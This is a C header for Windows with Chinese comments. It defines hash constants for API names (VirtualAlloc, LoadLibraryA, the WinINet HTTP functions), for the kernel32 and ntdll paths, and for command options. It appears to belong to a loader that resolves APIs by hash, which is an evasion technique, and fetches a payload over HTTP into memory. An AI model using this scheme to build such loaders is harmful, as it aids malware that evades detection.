#pragma once
#include <windows.h>
#include <wininet.h>
#include <winternl.h>

#define DEFAULT_HASHVALUE 5381			// hash函数默认值
#define UL 193429971					// -ul
#define FL 193429476					// -fl
#define XK 193430069					// -xk
#define HTTP 2090341317					// http
#define HTTPS 261786840					// https
#define MAX_SIZE 0x3000000			    // 响应默认最大长度
#define KERNEL32_DLL 2646973979			// L"C:\\Windows\\System32\\kernel32.dll";
#define NTDLL 2960136019				// L"C:\\Windows\\System32\\ntdll.dll";
#define DllRegisterServer 522135165		// DllRegisterServer
#define RtlVirtuallUnwind 2562221407    // RtlVirtuallUnwind
#define VirtualAlloc 1490734039			// VirtualAlloc
#define CreateFileA 2574286426			// CreateFileA
#define GetFileSize 2893321600			// GetFileSize
#define ReadFile 4182622561			    // ReadFile
#define LoadLibraryA 107362651			// LoadLibraryA
#define InternetOpenA  3805393153		// InternetOpenA 
#define InternetConnectA 1395833273		// InternetConnectA
#define HttpOpenRequestA 508018273		// HttpOpenRequestA
#define HttpSendRequestA 3197901369		// HttpSendRequestA
#define HttpQueryInfoA 1094672648		// HttpQueryInfoA
#define InternetReadFile 171995914		// InternetReadFile
#define InternetCloseHandle 1405764432	// InternetCloseHandle